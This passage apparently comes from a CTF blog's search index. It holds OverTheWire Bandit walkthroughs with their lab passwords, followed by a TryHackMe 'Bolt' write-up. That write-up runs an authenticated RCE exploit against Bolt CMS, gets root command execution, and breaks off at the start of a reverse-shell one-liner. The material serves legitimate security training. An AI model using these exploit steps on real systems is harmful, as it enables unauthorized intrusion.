. \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.orgWelcome to OverTheWire!For support, questions or comments, contact us through IRC onirc.overthewire.org #wargames.Enjoy your stay!bandit17@bandit:~$Level 17 -&gt; Level 18GoalThere are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.newNOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19SolutionMy methodThe way i first solved this challenge was by printing the two files, sorting the output and used uniq to be left with the two strings that got changed, and one of them is the password.bandit17@bandit:~$ cat passwords.* | sort | uniq -ukfBf3eYk5BPBRzwjqutbbfE887SVc5Ydw0Yfolrc5bwjS4qw5mq1nnQi6mF03biiOther methodWe can simply use diff to compare the files line by line.bandit17@bandit:~$ diff passwords.new passwords.old42c42&lt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd---&gt; w0Yfolrc5bwjS4qw5mq1nnQi6mF03biiLevel 18 -&gt; Level 19GoalThe password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.SolutionThis one mad me lose my mind. Every time we connect to bandit18 we get the following.Byebye !Connection to bandit.labs.overthewire.org closed.As described in the Goal, we get logged out everytime we log in with ssh, so we can try to execute a command that prints readme file without waiting to get a shell.┌──(sirius㉿kali)-[~]└─$ ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org's password:IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5xLevel 19 -&gt; Level 20GoalTo gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.SolutionLet’s first see what the command does.bandit19@bandit:~$ ls -ltotal 8-rwsr-x--- 1 bandit20 bandit19 7296 May 7 2020 bandit20-dobandit19@bandit:~$ ./bandit20-doRun a command as another user. Example: ./bandit20-do idIt runs a command as another user, and it gives us an example.bandit19@bandit:~$ ./bandit20-do iduid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)We see that we ran id as bandit20, so we might as well read /etc/bandi_pass/bandit20 which contains bandi20’s passwordbandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20GbKksEFF4yrVs6il55v6gwY5aVje5f0jbandit19@bandit:~$Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "OverTheWire - Bandit - Level 10 -> Level 15", "url": "/posts/Bandit-10-15/", "categories": "OverTheWire, Bandit", "tags": "overthewire, bandit, linux", "date": "2022-02-09 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. In today’s episode, we will be doing Level 10 -&gt; Level 15 of Bandit from OverTheWire. Let’s connect to bandit10 and start.Level 10 -&gt; Level 11GoalThe password for the next level is stored in the file data.txt, which contains base64 encoded dataSolutionWe can use base64 with -d to decode the file.bandit10@bandit:~$ lsdata.txtbandit10@bandit:~$ cat data.txtVGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==bandit10@bandit:~$ base64 -d data.txtThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbxxxLevel 11 -&gt; Level 12GoalThe password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positionsSolutionFrom the description, the file content is encoded with rot13.bandit11@bandit:~$ lsdata.txtbandit11@bandit:~$ cat data.txtGur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2xxxIndeed it is, we can write a python script to decode the strings or just simply go to google and search for rot13. This site Rot13 can decode the strings for us.Level 12 -&gt; Level 13GoalThe password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)SolutionFot this level, we need to create a directory in /tmp in order to be able to write files, move to that directory, and copy the data.txt file to us.bandit12@bandit:~$ mkdir /tmp/hackbandit12@bandit:~$ cd /tmp/hackbandit12@bandit:/tmp/hack$ cp ~/data.txt .bandit12@bandit:/tmp/hack$ lsdata.txtIf we read the file, we see that it is hexdump, we can change that using xxd with -r to convert the file to it’s precious form, and then we need to write the output to a file.bandit12@bandit:/tmp/hack$ xxd -r data.txt &gt; filebandit12@bandit:/tmp/hack$ lsdata.txt file.txtbandit12@bandit:/tmp/hack$ file file.txtIn the Goal, we’ve been told that the file has been repeatedly compressed, let’s use file to determine the type of file.txtbandit12@bandit:/tmp/hack$ file file.txtfile.txt: gzip compressed data, was \"data2.bin\", last modified: Thu May 7 18:14:30 2020, max compression, from UnixIt’s a gzip compressed file. We need to rename it from file.txt to file.gz to be able to decompress it.bandit12@bandit:/tmp/hack$ lsdata.txt file.txtbandit12@bandit:/tmp/hack$ mv file.txt file.gzbandit12@bandit:/tmp/hack$ lsdata.txt file.gzbandit12@bandit:/tmp/hack$ gzip -d file.gzbandit12@bandit:/tmp/hack$ lsdata.txt filebandit12@bandit:/tmp/hack$ file filefile: bzip2 compressed data, block size = 900kGreat, we decompressed the file successfully, and we got a file called file and it is also compressed with bzip2, let’s rename the file to file.bz2 and decompress it using bzip2 -dbandit12@bandit:/tmp/hack$ mv file file.bz2bandit12@bandit:/tmp/hack$ lsdata.txt file.bz2bandit12@bandit:/tmp/hack$ bzip2 -d file.bz2bandit12@bandit:/tmp/hack$ lsdata.txt filebandit12@bandit:/tmp/hack$ file filefile: gzip compressed data, was \"data4.bin\", last modified: Thu May 7 18:14:30 2020, max compression, from UnixNow we have gzip compressed file, I assume you know what to do now.bandit12@bandit:/tmp/hack$ mv file file.gzbandit12@bandit:/tmp/hack$ gzip -d file.gzbandit12@bandit:/tmp/hack$ lsdata.txt filebandit12@bandit:/tmp/hack$ file filefile: POSIX tar archive (GNU)We now have tar compressed file.bandit12@bandit:/tmp/hack$ mv file file.tarbandit12@bandit:/tmp/hack$ tar -xvf file.tardata5.binbandit12@bandit:/tmp/hack$ lsdata5.bin data.txt file.tarbandit12@bandit:/tmp/hack$ file data5.bindata5.bin: POSIX tar archive (GNU)Another tar compressed file.bandit12@bandit:/tmp/hack$ mv data5.bin data.tarbandit12@bandit:/tmp/hack$ tar -xvf data.tardata6.binbandit12@bandit:/tmp/hack$ file data6.bindata6.bin: bzip2 compressed data, block size = 900kNow a bzip2 compressed file.andit12@bandit:/tmp/hack$ mv data6.bin data6.bz2bandit12@bandit:/tmp/hack$ bzip2 -d data6.bz2bandit12@bandit:/tmp/hack$ lsdata6 data.tar data.txt file.tarbandit12@bandit:/tmp/hack$ file data6data6: POSIX tar archive (GNU)We got a tar compressed filebandit12@bandit:/tmp/hack$ mv data6 data6.tarbandit12@bandit:/tmp/hack$ tar -xfv data6.tartar: v: Cannot open: No such file or directorytar: Error is not recoverable: exiting nowbandit12@bandit:/tmp/hack$ tar -xvf data6.tardata8.binbandit12@bandit:/tmp/hack$ file data8.bindata8.bin: gzip compressed data, was \"data9.bin\", last modified: Thu May 7 18:14:30 2020, max compression, from UnixI know what you thinking right now, is this ever going to end?! No worries, i was asking the same question. Let’s decompress this gzip file.bandit12@bandit:/tmp/hack$ mv data8.bin data8.gzbandit12@bandit:/tmp/hack$ gzip -d data8.gzbandit12@bandit:/tmp/hack$ lsdata6.tar data8 data.tar data.txt file.tarbandit12@bandit:/tmp/hack$ file data8data8: ASCII textbandit12@bandit:/tmp/hack$ cat data8The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORxxxbandit12@bandit:/tmp/hack$Finally, we finished the decompression and got our password.Level 13 -&gt; Level 14GoalThe password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working onSolutionWith a private SSH key, we can connect without providing a password, so let’s copy the content of sshkey.private file and put it in a file in our machine. Normaly, the file that holds the private key get named id_rsa, you can name whatever you want. We can connect by adding -i {private_key} after ssh command, the full command would be like this ssh -i {private_key} bandit14@bandit.labs.overthewire.org -p 2220$ ssh -i id_rsa bandit14@bandit.labs.overthewire.org -p 2220 130 ⨯This is a OverTheWire game server. More information on http://www.overthewire.org/wargames@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0644 for 'id_rsa' are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key \"id_rsa\": bad permissionsbandit14@bandit.labs.overthewire.org's password:“Wait, you said we don’t need a password!”Yes, but for the private key to do it’s job, it needs to have certain file permissions (600), we need to change it’s permissions using chmod 600 {private_key}, which mean that only the owner of the file can read and write the file.$ chmod 600 id_rsa 130 ⨯$ ssh -i id_rsa bandit14@bandit.labs.overthewire.org -p 2220This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesLinux bandit.otw.local 5.4.8 x86_64 GNU/Linux...bandit14@bandit:~$The password for bandit14 is located in /etc/bandit_pass/bandit14.bandit14@bandit:~$ cat /etc/bandit_pass/bandit144wcYUJFw0k0XLShlDzztnTBHiqxU3xxxLevel 14 -&gt; Level 15GoalThe password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.SolutionWe can use telnet to connect to localhost on port 30000 and submit the password.bandit14@bandit:~$ telnet localhost 30000 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Correct! BfMYroe26WYalil77FoDi9qh59eK5xxx Connection closed by foreign hostThank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "OverTheWire - Bandit - Level 5 -> Level 10", "url": "/posts/Bandit-5-10/", "categories": "OverTheWire, Bandit", "tags": "overthewire, bandit, linux", "date": "2022-02-07 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. In today’s episode we will be doing Level 5 -&gt; Level 10 of Bandit from OverTheWire. Let’s connect to bandit5 and start.Level 5 -&gt; Level 6GoalThe password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties: human-readable 1033 bytes in size not executableSolutionWith that information, we can use find with the following tags: ./ : To start the search from the current directory. -type f : To search for files. -size 1033c : To look for files with the 1033 bytes in sizebandit5@bandit:~$ lsinherebandit5@bandit:~$ cd inhere/bandit5@bandit:~/inhere$ lsmaybehere00 maybehere02 maybehere04 maybehere06 maybehere08 maybehere10 maybehere12 maybehere14 maybehere16 maybehere18maybehere01 maybehere03 maybehere05 maybehere07 maybehere09 maybehere11 maybehere13 maybehere15 maybehere17 maybehere19bandit5@bandit:~/inhere$ find ./ -type f -size 1033c./maybehere07/.file2bandit5@bandit:~/inhere$ cat ./maybehere07/.file2DXjZPULLxYr17uwoI01bNLQbtFemExxxLevel 6 -&gt; Level 7GoalThe password for the next level is stored somewhere on the server and has all of the following properties:owned by user bandit7owned by group bandit633 bytes in sizeSolutionWe can use find to search for this file with the following tags. / : Start the search in the root directory. -type f : Search for files. -user bandit7 : Files owned by user bandit7. -group bandit6 : Files owned by group bandit6. size 33c : Files with 33 bytes in size 2&gt;/dev/null : Send any errors to /dev/null bandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null/var/lib/dpkg/info/bandit7.passwordbandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.passwordHKBPTKQnIay4Fw76bEy8PVxKEDQRKxxx Level 7 -&gt; Level 8GoalThe password for the next level is stored in the file data.txt next to the word millionthSolutionWe can read the file with cat and pip it to grep that will search for the word ‘millionth’ in that output.bandit7@bandit:~$ ls -ltotal 4088-rw-r----- 1 bandit8 bandit7 4184396 May 7 2020 data.txtbandit7@bandit:~$ cat data.txt | grep 'millionth'millionth cvX2JJa4CFALtqS87jk27qwqGhBM9xxxLevel 8 -&gt; Level 9GoalThe password for the next level is stored in the file data.txt and is the only line of text that occurs only onceSolutionIn data.txt, every sentence is repeated more than once, except our password. We need to sort the content of the file and delete the duplicates in it, we can do that with sort and uniq -u.bandit8@bandit:~$ lsdata.txtbandit8@bandit:~$ sort data.txt | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQxxxLevel 9 -&gt; Level 10GoalThe password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.SolutionWe can print the only human-readable strings with the command strings, we can then pip the output to grep and look for = signs.bandit9@bandit:~$ lsdata.txtbandit9@bandit:~$ strings data.txt | grep ============ the*2i\"4========== passwordZ)========== is&amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFxxxThank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "OverTheWire - Bandit - Level 0 -> Level 5", "url": "/posts/Bandit-0-5/", "categories": "OverTheWire, Bandit", "tags": "overthewire, bandit, linux", "date": "2022-02-05 01:00:00 +0100", "snippet": "DescriptionHello l33ts, I hope you are doing well. We are going to start Bandit series from OverTheWire. The Bandit wargame is aimed at absolute beginners. It will teach the basics needed to be able to play other wargames. The goal in this games is to retrieve a string, that’s going to be the password for the next game. Whenever you find a password for a level, use it to log into that level with SSH.Level 0 -&gt; Level 1GOALThe password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.SOLUTION$ ssh bandit0@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit0@bandit.labs.overthewire.org's password: Linux bandit.otw.local 5.4.8 x86_64 GNU/Linux ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to Steven or morla on irc.overthewire.org. --[ Playing the games ]--Enjoy your stay!bandit0@bandit:~$We list the content of the current directory, we find a file called readme, we read it and we get the password.bandit0@bandit:~$ ls -altotal 24drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profile-rw-r----- 1 bandit1 bandit0 33 May 7 2020 readmebandit0@bandit:~$ cat readmeboJ9jbbUNNfktd78OOpsqOlxxxxxxxxxbandit0@bandit:~$Level 1 -&gt; Level 2GOALThe password for the next level is stored in a file called - located in the home directorySOLUTION$ ssh bandit1@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit1@bandit.labs.overthewire.org's password:bandit1@bandit:~$ ls-bandit1@bandit:~$ cat -We can’t read it the normal way. We search for this problem, and find we can read it using cat ./-bandit1@bandit:~$ cat ./-CV1DtqXWVFXTvM2F0k09SHzxxxxxxxxxbandit1@bandit:~$Level 2 -&gt; Level 3GOALThe password for the next level is stored in a file called spaces in this filename located in the home directorySOLUTION$ ssh bandit2@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit2@bandit.labs.overthewire.org's password:bandit2@bandit:~$ ls -altotal 24drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profile-rw-r----- 1 bandit3 bandit2 33 May 7 2020 spaces in this filenamebandit2@bandit:~$ cat spaces\\ in\\ this\\ filenameUmHadQclWmgdLOKQ3YNgjWxGoRMb5xxxbandit2@bandit:~$Level 3 -&gt; Level 4GOALThe password for the next level is stored in a hidden file in the inhere directory.SOLUTION$ ssh bandit3@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit3@bandit.labs.overthewire.org's password:bandit3@bandit:~$ cd inhere/bandit3@bandit:~/inhere$ lsbandit3@bandit:~/inhere$ ls -altotal 12drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 3 root root 4096 May 7 2020 ..-rw-r----- 1 bandit4 bandit3 33 May 7 2020 .hiddenbandit3@bandit:~/inhere$ cat .hiddenpIwrPrtPN36QITSp3EQaw936yaFoFxxxbandit3@bandit:~/inhere$Level 4 -&gt; Level 5GOALThe password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.SOLUTION$ ssh bandit4@bandit.labs.overthewire.org -p 2220 This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit4@bandit.labs.overthewire.org's password:bandit4@bandit:~$ lsinherebandit4@bandit:~$ cd inhere/bandit4@bandit:~/inhere$ ls-file00 -file01 -file02 -file03 -file04 -file05 -file06 -file07 -file08 -file09bandit4@bandit:~/inhere$ cat ./-file00/`2ғ%rL~5gbandit4@bandit:~/inhere$We get some weird data when we try to read the file, let’s list the type of every file with the command filebandit4@bandit:~/inhere$ file ./*./-file00: data./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data./-file06: data./-file07: ASCII text./-file08: data./-file09: databandit4@bandit:~/inhere$ cat ./-file07koReBOKuIDDepwhWk7jZC0RTdopnAxxxbandit4@bandit:~/inhere$Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "TryHackMe - Bolt", "url": "/posts/Bolt/", "categories": "TryHackMe", "tags": "tryhackme, linux, cms, metasploit, cve, rce", "date": "2022-02-03 01:00:00 +0100", "snippet": " DescriptionHello l33ts, I hope you are doing well. Today we are going to look at Bolt from TryHackMe. This room is designed for users to get familiar with the Bolt CMS and how it can be exploited using Authenticated Remote Code Execution. To solve this machine, we scan for ports using nmap, we find a webserver running Bolt CMS, after some enumeration, we find a username and a password, and we use them to login to Bolt CMS, we look for the version and we find that it is vulnerable, and with that, we use an exploit to get into the machine. If you have any questions please feel free to ask me on any of my socials.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressice scan to provide faster results. Starting Nmap 7.92 ( https://nmap.org )Nmap scan report for 10.10.234.51Host is up (0.12s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)| 256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)|_ 256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.29 (Ubuntu)8000/tcp open http (PHP 7.2.32-1)| fingerprint-strings:| FourOhFourRequest:| HTTP/1.0 404 Not Found| Date: 15:19:44 GMT| Connection: close| X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1...There are 3 open ports: 22(SSH) 80(HTTP) 8000(HTTP)webPort 80 has nothing interesting, even if we run a directory scan we get nothing, it is just the default Apache welcome page. Let’s move to the other port.To access the web page on port 8000 we add :8000 next to the url -&gt; http://{target_IP}:8000.When we visit the web page, we find that Bolt CMS is running, and after looking around, we see a username and a password, and they belong to the admin!Let’s try login to the CMS using them. The login page is at /bolt/login:http://{target_IP}:8000/bolt/loginGreat, the credentials are valid, and we can see the version of the CMS. Let’s see if Bolt CMS has any Vulnerabilities.$ searchsploit Bolt CMS --------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path--------------------------------------------------------------------------------------------------------------------------- ---------------------------------Bolt CMS 3.6.10 - Cross-Site Request Forgery | php/webapps/47501.txtBolt CMS 3.6.4 - Cross-Site Scripting | php/webapps/46495.txtBolt CMS 3.6.6 - Cross-Site Request Forgery / Remote Code Execution | php/webapps/46664.htmlBolt CMS 3.7.0 - Authenticated Remote Code Execution | php/webapps/48296.pyBolt CMS &lt; 3.6.2 - Cross-Site Scripting | php/webapps/46014.txtCMS Bolt - Arbitrary File Upload (Metasploit) | php/remote/38196.rb--------------------------------------------------------------------------------------------------------------------------- ---------------------------------Great! We have an Authenticated RCE, let’s do it.FootholdMethod 1 (python script)For this, we need have an exploit, we will use Bolt CMS 3.7.0 - Authenticated Remote Code Execution | php/webapps/48296.py that searchsploit found earlier :$ searchsploit -p 48296.py 130 ⨯ Exploit: Bolt CMS 3.7.0 - Authenticated Remote Code Execution URL: https://www.exploit-db.com/exploits/48296 Path: /usr/share/exploitdb/exploits/php/webapps/48296.pyFile Type: Python script, Unicode text, UTF-8 text executableWe can either go to the URL and download the script, or copy it from our machine to our current working directory:$ cp /usr/share/exploitdb/exploits/php/webapps/48296.py .Let’s run the script without any arguments to see how it works:$ python3 exploit.py ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌ ▐░░▌▐░░░░░░░░░░░▌ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌ ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌ ▐░▌▐░▌ ▐░▌▐░▌ ▐░▌ ▐░▌ ▐░▌▐░▌ ▐░▌▐░▌▐░▌ ▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌▐░▌ ▐░▌ ▐░▌ ▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░░░░░░░░░░▌ ▐░▌ ▐░▌▐░▌ ▐░▌ ▐░▌ ▐░▌ ▐░▌ ▐░▌▐░░░░░░░░░░░▌ ▐░█▀▀▀▀▀▀▀█░▌▐░▌ ▐░▌▐░▌ ▐░▌ ▐░▌ ▐░▌ ▀ ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░▌ ▐░▌▐░▌ ▐░▌▐░▌ ▐░▌ ▐░▌ ▐░▌ ▐░▌ ▐░▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌ ▐░░░░░░░░░░░▌▐░▌ ▐░▌▐░░░░░░░░░░░▌ ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀ ▀▀▀▀▀▀▀▀▀▀▀Pre Auth rce with low credintanl#Zero-way By @r3m0t3nu11 speical thanks to @dracula @Mr_Hex1[~] Usage : ./bolt.py url username passwordNow we can run the script and give it the url, the username and the password for it to do its job:$ sudo python3 48296.py http://10.10.102.179:8000 bolt boltadmin123 1 ⨯ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌ ▐░░▌▐░░░░░░░░░░░▌ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌ ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌ ▐░▌▐░▌ ▐░▌▐░▌ ▐░▌ ▐░▌ ▐░▌▐░▌ ▐░▌▐░▌▐░▌ ▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌▐░▌ ▐░▌ ▐░▌ ▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░░░░░░░░░░▌ ▐░▌ ▐░▌▐░▌ ▐░▌ ▐░▌ ▐░▌ ▐░▌ ▐░▌▐░░░░░░░░░░░▌ ▐░█▀▀▀▀▀▀▀█░▌▐░▌ ▐░▌▐░▌ ▐░▌ ▐░▌ ▐░▌ ▀ ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌ ▐░▌ ▐░▌▐░▌ ▐░▌▐░▌ ▐░▌ ▐░▌ ▐░▌ ▐░▌ ▐░ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌ ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌ ▐░░░░░░░░░░░▌▐░▌ ▐░▌▐░░░░░░░░░░░▌ ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀ ▀▀▀▀▀▀▀▀▀▀▀ Pre Auth rce with low credintanl #Zero-way By @r3m0t3nu11 speical thanks to @dracula @Mr_Hex [+] Retrieving CSRF token to submit the login form [+] Login token is : MJftCjkexQaiBqGDiuJEew7Nd0w6NzOO0YFOktnMvjA [+] SESSION INJECTION [-] Not found. [-] Not found. [-] Not found. [-] Not found. [-] Not found. [-] Not found. [+] FOUND : test7 [-] Not found. [-] Not found. [-] Not found. Enter OS command , for exit 'quit' :With that, we can now execute commands on the machine, but the output is a bit ugly, and it’s not a stable shell.Enter OS command , for exit 'quit' : whoami root \";s:8:\"*stack\";a:0:{}s:10:\"*enabled\";i:1;s:17:\"*shadowpassword\";N;s:14:\"*shadowtoken\";N;s:17:\"*shadowvalidity\";N;s:15:\"*failedlogins\";i:0;s:17:\"*throttleduntil\";N;s:8:\"*roles\";a:2:{i:0;s:4:\"root\";i:1;s:8:\"everyone\";}s:7:\"_fields\";a:0:{}s:42:\"Bolt\\Storage\\Entity\\Entity_specialFields\";a:2:{i:0;s:3:\"app\";i:1;s:6:\"values\";}s:7:\"*_app\";N;s:12:\"*_internal\";a:1:{i:0;s:11:\"contenttype\";}}s:8:\"*token\";O:29:\"Bolt\\Storage\\Entity\\Authtoken\":12:{s:5:\"*id\";s:1:\"5\";s:10:\"*user_id\";i:1;s:8:\"*token\";s:64:\"56802548e9d05e94d9fc3c9456e294e20ce90c11f52ed46e8c79027bd5a98c92\";s:7:\"*salt\";s:32:\"8ef9c776af3bd28a8a841a7c03b2c6fb\";s:11:\"*lastseen\";O:13:\"Carbon\\Carbon\":3:{s:4:\"date\";s:26:\"2022-01-30 13:24:04.608166\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:5:\"*ip\";s:12:\"10.11.31.131\";s:12:\"*useragent\";s:22:\"python-requests/2.25.1\";s:11:\"*validity\";O:13:\"Carbon\\Carbon\":3:{s:4:\"date\";s:26:\"2022-02-13 13:24:04.000000\";s:13:\"timezone_type\";i:3;s:8:\"timezone\";s:3:\"UTC\";}s:7:\"_fields\";a:0:{}s:42:\"Bolt\\Storage\\Entity\\Entity_specialFields\";a:2:{i:0;s:3:\"app\";i:1;s:6:\"values\";}s:7:\"*_app\";N;s:12:\"*_internal\";a:1:{i:0;s:11:\"contenttype\";}}s:10:\"*checked\";i:1643549044;}s:10:\"_csrf/bolt\";s:43:\"cu0xYbhKWkCu8TMIk6KZvUWE1a6qdy6zZXz52LWimzM\";s:5:\"stack\";a:0:{}s:18:\"_csrf/user_profile\";s:43:\"hzusDAv_pYKHa0wNU_sM3mYS5DX6Y2G2jZaNNE5rIxQ\";}s:12:\"_sf2_flashes\";a:0:{}s:9:\"_sf2_meta\";a:3:{s:1:\"u\";i:1643549051;s:1:\"c\";i:1643549043;s:1:\"l\";s:1:\"0\";}} Enter OS command , for exit 'quit' :What we can do is use a one liner python3 command that can send us a shell, and we can then make our shell stable and functional. Here is the script i used:python3 -c 'import 